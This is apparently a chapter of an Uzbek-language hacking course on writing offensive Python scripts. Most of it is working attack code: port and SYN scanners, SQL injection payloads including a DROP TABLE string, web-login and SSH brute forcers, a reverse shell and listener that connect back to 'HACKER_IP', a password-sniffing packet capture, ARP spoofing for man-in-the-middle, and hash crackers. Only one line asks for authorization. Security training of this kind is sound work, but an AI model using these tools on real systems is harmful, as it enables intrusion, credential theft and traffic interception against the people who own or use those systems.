# 📘 7-BOB: PYTHON BILAN HACKING SKRIPTLARI

---

## 7.1 Nima uchun Python?

Python — kiberxavfsizlik mutaxassisining eng yaxshi do'sti:
- 🔧 Tez skript yozish imkoni
- 📦 Ko'p tayyor kutubxonalar (`socket`, `requests`, `scapy`)
- 🤖 Barcha mashhur toollar Python da yozilgan
- 🧠 O'rganish oson, lekin juda kuchli

```bash
# Python versiyasini tekshirish
python3 --version

# Kerakli kutubxonalarni o'rnatish
pip3 install requests scapy colorama paramiko pwntools
```


---

## 7.2 Python asoslari — tez takrorlash

```python
# O'zgaruvchilar
ip = "192.168.1.1"
port = 80
xavfsizmi = True

# Ro'yxat (list)
portlar = [21, 22, 80, 443, 3306, 8080]

# Lug'at (dict)
xost = {"ip": "192.168.1.1", "os": "Linux", "port": 22}

# Shartlar
if port == 80:
    print("HTTP port")
elif port == 443:
    print("HTTPS port")
else:
    print(f"Boshqa port: {port}")

# Tsikl
for p in portlar:
    print(f"Port tekshirilmoqda: {p}")

# Funksiya
def skanla(ip, port):
    print(f"{ip}:{port} skanlanmoqda...")
    return True

# Exception
try:
    natija = 10 / 0
except ZeroDivisionError as e:
    print(f"Xatolik: {e}")

# Fayl o'qish
with open("wordlist.txt", "r") as f:
    parollar = f.read().splitlines()

# Fayl yozish
with open("natija.txt", "w") as f:
    f.write("Topildi: 192.168.1.1:22\n")
```


---

## 7.3 Socket — Tarmoq dasturlash

```python
import socket

# -----------------------------------------------
# 1. Oddiy port scanner
# -----------------------------------------------
def port_scanner(ip, port):
    """Bitta portni tekshirish"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1)  # 1 soniya kutish
        natija = sock.connect_ex((ip, port))
        sock.close()
        return natija == 0  # 0 = ochiq
    except Exception:
        return False

# -----------------------------------------------
# 2. Ko'p portli scanner
# -----------------------------------------------
def multi_port_scanner(ip, portlar):
    """Bir nechta portni skanerlash"""
    print(f"\n[*] {ip} skanlanmoqda...\n")
    ochiq = []
    for port in portlar:
        if port_scanner(ip, port):
            try:
                # Servis nomini aniqlash
                servis = socket.getservbyport(port)
            except:
                servis = "noma'lum"
            print(f"  [+] {port}/tcp  OCHIQ  ({servis})")
            ochiq.append(port)
        else:
            print(f"  [-] {port}/tcp  yopiq")
    print(f"\n[*] Jami {len(ochiq)} ta ochiq port topildi")
    return ochiq

# Ishlatish:
if __name__ == "__main__":
    target = input("IP manzil kiriting: ")
    portlar = [21, 22, 23, 25, 53, 80, 110, 135, 139, 143,
               443, 445, 993, 995, 1723, 3306, 3389, 5900, 8080, 8443]
    multi_port_scanner(target, portlar)
```

```python
# -----------------------------------------------
# 3. Tez port scanner (threading bilan)
# -----------------------------------------------
import socket
import threading
from queue import Queue

def tez_scanner(ip, start_port=1, end_port=1024):
    ochiq_portlar = []
    lock = threading.Lock()
    q = Queue()

    # Portlarni navbatga qo'shish
    for port in range(start_port, end_port + 1):
        q.put(port)

    def worker():
        while not q.empty():
            port = q.get()
            try:
                s = socket.socket()
                s.settimeout(0.5)
                s.connect((ip, port))
                with lock:
                    ochiq_portlar.append(port)
                    print(f"  [+] {port} OCHIQ")
                s.close()
            except:
                pass
            q.task_done()

    # 100 ta thread
    threadlar = []
    for _ in range(100):
        t = threading.Thread(target=worker)
        t.daemon = True
        t.start()
        threadlar.append(t)

    q.join()
    return sorted(ochiq_portlar)

# Ishlatish:
# ochiq = tez_scanner("192.168.1.1", 1, 1024)
```


---

## 7.4 Banner Grabbing va Servis Aniqlash

```python
import socket

def banner_grab(ip, port):
    """Servis banner ini olish"""
    try:
        s = socket.socket()
        s.settimeout(3)
        s.connect((ip, port))

        # HTTP uchun GET so'rov yuborish
        if port in [80, 8080, 8000]:
            s.send(b"GET / HTTP/1.1\r\nHost: " + ip.encode() + b"\r\n\r\n")
        elif port == 21:
            pass  # FTP o'zi banner yuboradi
        elif port == 22:
            pass  # SSH o'zi yuboradi

        banner = s.recv(1024).decode(errors='ignore').strip()
        s.close()
        return banner
    except Exception as e:
        return None

# Ko'p portda banner olish
def scan_with_banners(ip, portlar):
    print(f"\n{'='*50}")
    print(f"  TARGET: {ip}")
    print(f"{'='*50}")
    for port in portlar:
        s = socket.socket()
        s.settimeout(1)
        if s.connect_ex((ip, port)) == 0:
            banner = banner_grab(ip, port)
            if banner:
                # Faqat birinchi satr
                birinchi_satr = banner.split('\n')[0][:60]
                print(f"  [+] {port:5d}/tcp  |  {birinchi_satr}")
            else:
                print(f"  [+] {port:5d}/tcp  |  (banner yo'q)")
        s.close()

# scan_with_banners("192.168.1.1", [21,22,80,443,3306,8080])
```


---

## 7.5 Requests — Web Hacking

```python
import requests
from bs4 import BeautifulSoup  # pip3 install beautifulsoup4

# -----------------------------------------------
# 1. Web sahifani o'qish
# -----------------------------------------------
def web_request(url):
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    }
    try:
        r = requests.get(url, headers=headers, timeout=5, verify=False)
        print(f"[+] Status: {r.status_code}")
        print(f"[+] Server: {r.headers.get('Server', 'Noma\'lum')}")
        print(f"[+] Hajm: {len(r.content)} bytes")
        return r
    except requests.exceptions.RequestException as e:
        print(f"[-] Xatolik: {e}")
        return None

# -----------------------------------------------
# 2. Directory Brute Force
# -----------------------------------------------
def dir_bruteforce(base_url, wordlist_path):
    """Yashirin papkalarni topish"""
    print(f"\n[*] {base_url} skanlanmoqda...\n")
    topilganlar = []

    try:
        with open(wordlist_path, "r", errors="ignore") as f:
            so_zlar = f.read().splitlines()
    except FileNotFoundError:
        # Misol uchun kichik ro'yxat
        so_zlar = ["admin", "login", "dashboard", "backup",
                   "config", "uploads", "images", "api",
                   "test", "old", ".git", ".env", "phpinfo.php"]

    for so_z in so_zlar:
        url = f"{base_url}/{so_z}"
        try:
            r = requests.get(url, timeout=3, allow_redirects=False)
            if r.status_code in [200, 201, 301, 302, 403]:
                status_rang = {200: "✅", 301: "↪️", 302: "↪️", 403: "🔒"}
                belgi = status_rang.get(r.status_code, "❓")
                print(f"  {belgi} [{r.status_code}] {url}")
                topilganlar.append({"url": url, "status": r.status_code})
        except:
            pass

    print(f"\n[*] {len(topilganlar)} ta sahifa topildi")
    return topilganlar

# -----------------------------------------------
# 3. SQL Injection tekshirish
# -----------------------------------------------
def sqli_check(url, param):
    """Oddiy SQLi test"""
    payloadlar = [
        "'",
        "''",
        "' OR '1'='1",
        "' OR 1=1--",
        "\" OR \"\"=\"",
        "1' AND SLEEP(3)--",
        "1; DROP TABLE users--",
    ]
    xato_belgilar = [
        "sql syntax", "mysql_fetch", "ora-", "postgresql",
        "warning: mysql", "valid mysql", "sql server",
        "sqlite", "syntax error", "unclosed quotation"
    ]

    print(f"\n[*] SQL Injection tekshirilmoqda: {url}\n")
    for payload in payloadlar:
        try:
            params = {param: payload}
            r = requests.get(url, params=params, timeout=5)
            matn = r.text.lower()

            for xato in xato_belgilar:
                if xato in matn:
                    print(f"  [!] ZAIFLIK TOPILDI! Payload: {payload}")
                    print(f"      SQL xato: '{xato}' topildi")
                    break
            else:
                print(f"  [-] {payload[:30]:30} → Xato yo'q")
        except Exception as e:
            print(f"  [-] Xatolik: {e}")

# sqli_check("http://testphp.vulnweb.com/artists.php", "artist")
```


---

## 7.6 Login Brute Force Skripti

```python
import requests
import time

# -----------------------------------------------
# HTTP Form Login Brute Force
# -----------------------------------------------
def login_bruteforce(url, username, wordlist_path, 
                     user_field="username", pass_field="password",
                     fail_text="Invalid credentials"):
    """Web login formasini brute force qilish"""
    
    print(f"\n[*] Brute force boshlandi")
    print(f"[*] URL: {url}")
    print(f"[*] Username: {username}\n")

    try:
        with open(wordlist_path, "r", errors="ignore") as f:
            parollar = f.read().splitlines()
    except FileNotFoundError:
        parollar = ["admin", "password", "123456", "admin123",
                    "letmein", "qwerty", "monkey", "1234567890"]

    headers = {
        "User-Agent": "Mozilla/5.0",
        "Content-Type": "application/x-www-form-urlencoded"
    }

    session = requests.Session()

    for i, parol in enumerate(parollar):
        try:
            data = {
                user_field: username,
                pass_field: parol
            }
            r = session.post(url, data=data, headers=headers,
                           timeout=5, allow_redirects=True)

            # Muvaffaqiyatli kirish tekshirish
            if fail_text not in r.text and r.status_code == 200:
                print(f"\n  [!!!] PAROL TOPILDI!")
                print(f"  Username: {username}")
                print(f"  Parol: {parol}")
                return parol

            # Progress ko'rsatish
            if i % 100 == 0:
                print(f"  [*] {i}/{len(parollar)} sinaldi... ({parol})")

            time.sleep(0.1)  # Rate limit uchun

        except requests.exceptions.RequestException:
            continue

    print("\n[-] Parol topilmadi")
    return None

# -----------------------------------------------
# SSH Brute Force (Paramiko bilan)
# -----------------------------------------------
import paramiko  # pip3 install paramiko

def ssh_bruteforce(ip, username, wordlist_path, port=22):
    """SSH brute force"""
    print(f"\n[*] SSH Brute Force: {username}@{ip}:{port}\n")

    try:
        with open(wordlist_path, "r", errors="ignore") as f:
            parollar = f.read().splitlines()
    except FileNotFoundError:
        parollar = ["root", "admin", "password", "123456", "toor"]

    for parol in parollar:
        try:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client.connect(ip, port=port, username=username,
                         password=parol, timeout=3)
            print(f"\n  [!!!] SSH KIRISH TOPILDI!")
            print(f"  {username}@{ip} : {parol}")
            client.close()
            return parol
        except paramiko.AuthenticationException:
            print(f"  [-] {parol:20} → Noto'g'ri")
        except Exception as e:
            print(f"  [!] Xatolik: {e}")
            break

    return None

# ssh_bruteforce("192.168.1.1", "root", "/usr/share/wordlists/rockyou.txt")
```


---

## 7.7 Reverse Shell — Python bilan

```python
# -----------------------------------------------
# Oddiy Reverse Shell (maqsad mashinada ishlaydi)
# -----------------------------------------------
import socket
import subprocess
import os

def reverse_shell(hacker_ip, hacker_port):
    """Hackerdagi netcat ga ulanish"""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((hacker_ip, hacker_port))
        
        while True:
            buyruq = s.recv(1024).decode().strip()
            if buyruq.lower() in ["exit", "quit"]:
                break
            if buyruq:
                try:
                    natija = subprocess.check_output(
                        buyruq, shell=True,
                        stderr=subprocess.STDOUT
                    ).decode()
                except subprocess.CalledProcessError as e:
                    natija = e.output.decode()
                s.send(natija.encode())
        s.close()
    except Exception as e:
        pass

# -----------------------------------------------
# Listener (hackerdagi mashinada ishlaydi)
# -----------------------------------------------
def listener(port):
    """Reverse shell ni kutish"""
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind(("0.0.0.0", port))
    server.listen(1)
    print(f"[*] {port}-portda kutilmoqda...")

    client, addr = server.accept()
    print(f"[+] Ulanish: {addr[0]}:{addr[1]}")

    while True:
        buyruq = input("shell> ")
        if buyruq.lower() in ["exit", "quit"]:
            client.send(b"exit")
            break
        client.send(buyruq.encode())
        javob = client.recv(65535).decode()
        print(javob)

    client.close()
    server.close()

# Hacker mashinasida: listener(4444)
# Maqsad mashinasida: reverse_shell("HACKER_IP", 4444)
```


---

## 7.8 Hash Cracker — Python bilan

```python
import hashlib
import itertools
import string

# -----------------------------------------------
# 1. Wordlist asosida Hash Cracker
# -----------------------------------------------
def hash_crack_wordlist(target_hash, wordlist_path, hash_type="md5"):
    """Wordlist bilan hash crack qilish"""
    print(f"\n[*] Hash: {target_hash}")
    print(f"[*] Tur: {hash_type}")
    print(f"[*] Wordlist: {wordlist_path}\n")

    hash_funksiyalari = {
        "md5":    hashlib.md5,
        "sha1":   hashlib.sha1,
        "sha256": hashlib.sha256,
        "sha512": hashlib.sha512,
    }
    h_func = hash_funksiyalari.get(hash_type, hashlib.md5)

    try:
        with open(wordlist_path, "r", errors="ignore") as f:
            for i, satr in enumerate(f):
                so_z = satr.strip()
                hisoblangan = h_func(so_z.encode()).hexdigest()
                
                if hisoblangan == target_hash:
                    print(f"[!!!] TOPILDI: {so_z}")
                    return so_z
                
                if i % 100000 == 0 and i > 0:
                    print(f"[*] {i:,} ta sinaldi...")
    except FileNotFoundError:
        print(f"[-] Fayl topilmadi: {wordlist_path}")

    print("[-] Topilmadi")
    return None

# -----------------------------------------------
# 2. Brute Force Hash Cracker
# -----------------------------------------------
def hash_crack_brute(target_hash, max_uzunlik=6, hash_type="md5"):
    """Brute force bilan hash crack"""
    belgilar = string.ascii_lowercase + string.digits
    h_func = getattr(hashlib, hash_type)

    print(f"\n[*] Brute force boshlandi (max {max_uzunlik} belgi)\n")

    for uzunlik in range(1, max_uzunlik + 1):
        print(f"[*] {uzunlik} belgili kombinatsiyalar sinab ko'rilmoqda...")
        for kombinatsiya in itertools.product(belgilar, repeat=uzunlik):
            so_z = "".join(kombinatsiya)
            if h_func(so_z.encode()).hexdigest() == target_hash:
                print(f"\n[!!!] TOPILDI: {so_z}")
                return so_z
    return None

# -----------------------------------------------
# 3. Hash aniqlash
# -----------------------------------------------
def hash_identify(hash_str):
    """Hash turini aniqlash"""
    uzunlik = len(hash_str)
    turlar = {
        32:  "MD5",
        40:  "SHA-1",
        56:  "SHA-224",
        64:  "SHA-256",
        96:  "SHA-384",
        128: "SHA-512",
    }
    tur = turlar.get(uzunlik, "Noma'lum")
    print(f"Hash: {hash_str}")
    print(f"Uzunlik: {uzunlik}")
    print(f"Ehtimoliy tur: {tur}")

    # bcrypt tekshirish
    if hash_str.startswith("$2a$") or hash_str.startswith("$2b$"):
        print("Ehtimoliy tur: bcrypt")
    elif hash_str.startswith("$6$"):
        print("Ehtimoliy tur: SHA-512crypt (Linux parol)")
    elif hash_str.startswith("$1$"):
        print("Ehtimoliy tur: MD5crypt")

# Misol:
# hash_identify("5f4dcc3b5aa765d61d8327deb882cf99")
# hash_crack_wordlist("5f4dcc3b5aa765d61d8327deb882cf99",
#                     "/usr/share/wordlists/rockyou.txt", "md5")
```


---

## 7.9 Scapy — Paket Yaratish va Tahlil

```python
from scapy.all import *  # pip3 install scapy

# -----------------------------------------------
# 1. Ping (ICMP)
# -----------------------------------------------
def ping(ip):
    paket = IP(dst=ip) / ICMP()
    javob = sr1(paket, timeout=2, verbose=0)
    if javob:
        print(f"[+] {ip} tirik! TTL={javob.ttl}")
        return True
    print(f"[-] {ip} javob bermadi")
    return False

# -----------------------------------------------
# 2. Ping Sweep
# -----------------------------------------------
def ping_sweep(tarmoq):
    """192.168.1.0/24 formatda kiritish"""
    print(f"\n[*] {tarmoq} skanlanmoqda...\n")
    tiriklar = []
    
    paket = IP(dst=tarmoq) / ICMP()
    javoblar, _ = sr(paket, timeout=2, verbose=0)
    
    for yuborilgan, qabul in javoblar:
        print(f"  [+] {qabul.src} tirik")
        tiriklar.append(qabul.src)
    
    print(f"\n[*] {len(tiriklar)} ta tirik xost topildi")
    return tiriklar

# -----------------------------------------------
# 3. TCP SYN Scanner (Stealth Scanner)
# -----------------------------------------------
def syn_scan(ip, portlar):
    """Yashirin port skan (root kerak!)"""
    print(f"\n[*] SYN Skan: {ip}\n")
    ochiq = []

    for port in portlar:
        paket = IP(dst=ip) / TCP(dport=port, flags="S")
        javob = sr1(paket, timeout=1, verbose=0)
        
        if javob and javob.haslayer(TCP):
            if javob[TCP].flags == 0x12:  # SYN-ACK
                # RST yuboring (ulanishni o'chirish)
                rst = IP(dst=ip) / TCP(dport=port, flags="R")
                send(rst, verbose=0)
                print(f"  [+] {port} OCHIQ")
                ochiq.append(port)
            elif javob[TCP].flags == 0x14:  # RST
                pass  # Yopiq

    return ochiq

# -----------------------------------------------
# 4. Paket sniffer (Wireshark kabi)
# -----------------------------------------------
def paket_sniffer(interfeys="eth0", soni=10):
    """Tarmoq trafikni ushlash"""
    def tahlil(paket):
        if paket.haslayer(IP):
            src = paket[IP].src
            dst = paket[IP].dst
            
            if paket.haslayer(TCP):
                sport = paket[TCP].sport
                dport = paket[TCP].dport
                print(f"TCP: {src}:{sport} → {dst}:{dport}")
                
                # HTTP ma'lumotlar
                if paket.haslayer(Raw):
                    data = paket[Raw].load.decode(errors='ignore')
                    if "password" in data.lower() or "pass=" in data.lower():
                        print(f"  [!!!] PAROL TOPILDI: {data[:200]}")
            
            elif paket.haslayer(UDP):
                print(f"UDP: {src} → {dst}")

    print(f"[*] {interfeys} tinglayapman ({soni} paket)...")
    sniff(iface=interfeys, prn=tahlil, count=soni, store=0)

# -----------------------------------------------
# 5. ARP Spoofing (MITM uchun)
# -----------------------------------------------
def arp_spoof(maqsad_ip, router_ip):
    """ARP jadvalini zaharlash - FAQAT RUXSATLI TIZIMDA!"""
    maqsad_mac = getmacbyip(maqsad_ip)
    
    # Maqsadga: "Router mening MAC imman" de
    paket1 = ARP(op=2, pdst=maqsad_ip, hwdst=maqsad_mac, psrc=router_ip)
    # Routerga: "Maqsad mening MAC imman" de
    paket2 = ARP(op=2, pdst=router_ip, hwdst=getmacbyip(router_ip), psrc=maqsad_ip)
    
    print(f"[*] ARP Spoofing boshlandi: {maqsad_ip} ↔ {router_ip}")
    try:
        while True:
            send(paket1, verbose=0)
            send(paket2, verbose=0)
            time.sleep(2)
    except KeyboardInterrupt:
        print("\n[*] Toxtatildi, ARP tiklanyapti...")
        # Haqiqiy ARP ni tiklash
        send(ARP(op=2, pdst=maqsad_ip, hwdst="ff:ff:ff:ff:ff:ff",
                 psrc=router_ip, hwsrc=getmacbyip(router_ip)), count=5)
```


---

## 7.10 Kriptografiya Python bilan

```python
import hashlib
import base64
import os
from cryptography.fernet import Fernet  # pip3 install cryptography
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes

# -----------------------------------------------
# 1. Hash funksiyalar
# -----------------------------------------------
def hash_hisoblash(matn, tur="sha256"):
    """Matn hashini hisoblash"""
    h = hashlib.new(tur)
    h.update(matn.encode())
    return h.hexdigest()

print(hash_hisoblash("salom", "md5"))     # MD5
print(hash_hisoblash("salom", "sha256"))  # SHA-256
print(hash_hisoblash("salom", "sha512"))  # SHA-512

# -----------------------------------------------
# 2. Fernet (AES-128-CBC) shifrlash
# -----------------------------------------------
def fernet_shifrla(matn):
    kalit = Fernet.generate_key()  # Yangi kalit
    f = Fernet(kalit)
    shifrlangan = f.encrypt(matn.encode())
    return kalit, shifrlangan

def fernet_och(kalit, shifrlangan):
    f = Fernet(kalit)
    return f.decrypt(shifrlangan).decode()

# Misol:
kalit, shifrlangan = fernet_shifrla("Maxfiy xabar")
print(f"Shifrlangan: {shifrlangan}")
print(f"Ochildi: {fernet_och(kalit, shifrlangan)}")

# -----------------------------------------------
# 3. Base64 encode/decode
# -----------------------------------------------
def b64_encode(matn):
    return base64.b64encode(matn.encode()).decode()

def b64_decode(encoded):
    return base64.b64decode(encoded.encode()).decode()

print(b64_encode("Salom dunyo"))     # U2Fsb20gZHVueW8=
print(b64_decode("U2Fsb20gZHVueW8=")) # Salom dunyo

# -----------------------------------------------
# 4. XOR shifrlash (CTF da ko'p uchraydi)
# -----------------------------------------------
def xor_shifrla(matn, kalit):
    return bytes([ord(m) ^ ord(kalit[i % len(kalit)])
                  for i, m in enumerate(matn)])

def xor_och(shifrlangan, kalit):
    return bytes([b ^ ord(kalit[i % len(kalit)])
                  for i, b in enumerate(shifrlangan)]).decode()

shifrlangan = xor_shifrla("Salom", "kalit")
print(f"XOR: {shifrlangan.hex()}")
print(f"Ochildi: {xor_och(shifrlangan, 'kalit')}")

# -----------------------------------------------
# 5. Parol xavfsizligini tekshirish
# -----------------------------------------------
import re

def parol_kuchi(parol):
    """Parol kuchini baholash"""
    ball = 0
    maslahat = []

    if len(parol) >= 8:   ball += 1
    else: maslahat.append("Kamida 8 ta belgi kiriting")

    if len(parol) >= 12:  ball += 1
    if re.search(r'[A-Z]', parol): ball += 1
    else: maslahat.append("Katta harf qo'shing")

    if re.search(r'[a-z]', parol): ball += 1
    else: maslahat.append("Kichik harf qo'shing")

    if re.search(r'\d', parol):    ball += 1
    else: maslahat.append("Raqam qo'shing")

    if re.search(r'[!@#$%^&*()_+]', parol): ball += 1
    else: maslahat.append("Maxsus belgi qo'shing (!@#$)")

    darajalar = {1: "🔴 Juda zaif", 2: "🟠 Zaif",
                 3: "🟡 O'rtacha", 4: "🟢 Yaxshi",
                 5: "✅ Kuchli", 6: "💪 Juda kuchli"}

    print(f"\nParol: {parol}")
    print(f"Daraja: {darajalar.get(ball, '❓')}")
    if maslahat:
        print("Maslahatlar:")
        for m in maslahat:
            print(f"  - {m}")
    return ball

parol_kuchi("qwerty")
parol_kuchi("MyP@ssw0rd!")
```


---

## 7.11 To'liq avtomatlashtirilgan Recon Skripti

```python
#!/usr/bin/env python3
"""
auto_recon.py — Avtomatlashtirilgan razvedka skripti
Ishlatish: python3 auto_recon.py 192.168.1.1
"""

import socket
import subprocess
import sys
import os
import threading
from datetime import datetime

def nmap_skan(ip, natija_papka):
    """Nmap skan"""
    print(f"[*] Nmap skanlanmoqda: {ip}")
    cmd = f"nmap -sC -sV -oN {natija_papka}/nmap.txt {ip}"
    subprocess.run(cmd, shell=True, capture_output=True)
    print(f"[+] Nmap tugadi → {natija_papka}/nmap.txt")

def gobuster_skan(ip, natija_papka):
    """Gobuster directory skan"""
    print(f"[*] Gobuster skanlanmoqda: http://{ip}")
    wordlist = "/usr/share/wordlists/dirb/common.txt"
    if not os.path.exists(wordlist):
        print("[-] Wordlist topilmadi, o'tkazib yuborildi")
        return
    cmd = f"gobuster dir -u http://{ip} -w {wordlist} -o {natija_papka}/gobuster.txt -q"
    subprocess.run(cmd, shell=True, capture_output=True)
    print(f"[+] Gobuster tugadi → {natija_papka}/gobuster.txt")

def nikto_skan(ip, natija_papka):
    """Nikto web skan"""
    print(f"[*] Nikto skanlanmoqda: http://{ip}")
    cmd = f"nikto -h http://{ip} -o {natija_papka}/nikto.txt -Format txt"
    subprocess.run(cmd, shell=True, capture_output=True)
    print(f"[+] Nikto tugadi → {natija_papka}/nikto.txt")

def dns_recon(domain, natija_papka):
    """DNS ma'lumotlari"""
    print(f"[*] DNS recon: {domain}")
    natija = []
    record_turlari = ["A", "AAAA", "MX", "NS", "TXT", "CNAME"]
    for rtype in record_turlari:
        cmd = f"dig {domain} {rtype} +short"
        r = subprocess.run(cmd, shell=True, capture_output=True, text=True)
        if r.stdout.strip():
            natija.append(f"{rtype}: {r.stdout.strip()}")
    
    with open(f"{natija_papka}/dns.txt", "w") as f:
        f.write("\n".join(natija))
    print(f"[+] DNS tugadi → {natija_papka}/dns.txt")

def main():
    if len(sys.argv) < 2:
        print(f"Ishlatish: python3 {sys.argv[0]} <IP/DOMAIN>")
        sys.exit(1)

    target = sys.argv[1]
    vaqt = datetime.now().strftime("%Y%m%d_%H%M%S")
    natija_papka = f"recon_{target}_{vaqt}"
    os.makedirs(natija_papka, exist_ok=True)

    print(f"""
╔══════════════════════════════════════╗
║      AUTO RECON SKRIPTI              ║
║  Target: {target:<27} ║
║  Papka:  {natija_papka:<27} ║
╚══════════════════════════════════════╝
    """)

    # Paralel skan
    threadlar = [
        threading.Thread(target=nmap_skan, args=(target, natija_papka)),
        threading.Thread(target=gobuster_skan, args=(target, natija_papka)),
        threading.Thread(target=nikto_skan, args=(target, natija_papka)),
    ]

    for t in threadlar:
        t.start()
    for t in threadlar:
        t.join()

    print(f"\n[✓] Barcha skanlar tugadi!")
    print(f"[✓] Natijalar: {natija_papka}/")
    print(f"\nFayllar:")
    for f in os.listdir(natija_papka):
        print(f"  - {natija_papka}/{f}")

if __name__ == "__main__":
    main()
```


---

## 7.12 Bob yakunida bilishingiz kerak

✅ Python socket bilan port scanner yozish  
✅ Requests bilan web so'rovlar va brute force  
✅ Scapy bilan paket yaratish va tahlil  
✅ Hash hisoblash va crack qilish  
✅ Reverse shell yozish  
✅ Avtomatlashtirilgan recon skripti  
✅ Threading bilan tez skript yozish  

---

## 📝 Amaliy topshiriq #7

```bash
# 1. Port scanner yozing va o'z kompyuteringizni skanlang
python3 -c "
import socket, threading
from queue import Queue

ochiq = []
q = Queue()
[q.put(p) for p in range(1, 1025)]

def scan():
    while not q.empty():
        port = q.get()
        s = socket.socket()
        s.settimeout(0.3)
        if s.connect_ex(('127.0.0.1', port)) == 0:
            ochiq.append(port)
            print(f'[+] {port} ochiq')
        s.close()
        q.task_done()

[threading.Thread(target=scan, daemon=True).start() for _ in range(50)]
q.join()
print(f'Jami {len(ochiq)} port ochiq')
"

# 2. Hash cracker skriptini yozing:
#    - MD5: 5f4dcc3b5aa765d61d8327deb882cf99
#    - Rockyou wordlist bilan crack qiling

# 3. auto_recon.py ni saqlang va ishga tushiring:
python3 auto_recon.py 192.168.1.1

# 4. Scapy bilan oddiy ping flood sinab ko'ring (o'z VM da):
# sudo python3 -c "
# from scapy.all import *
# send(IP(dst='127.0.0.1')/ICMP(), count=10, verbose=1)
# "
```

---

*Keyingi bob → 🏆 CTF va Amaliyot yo'riqnomasi*
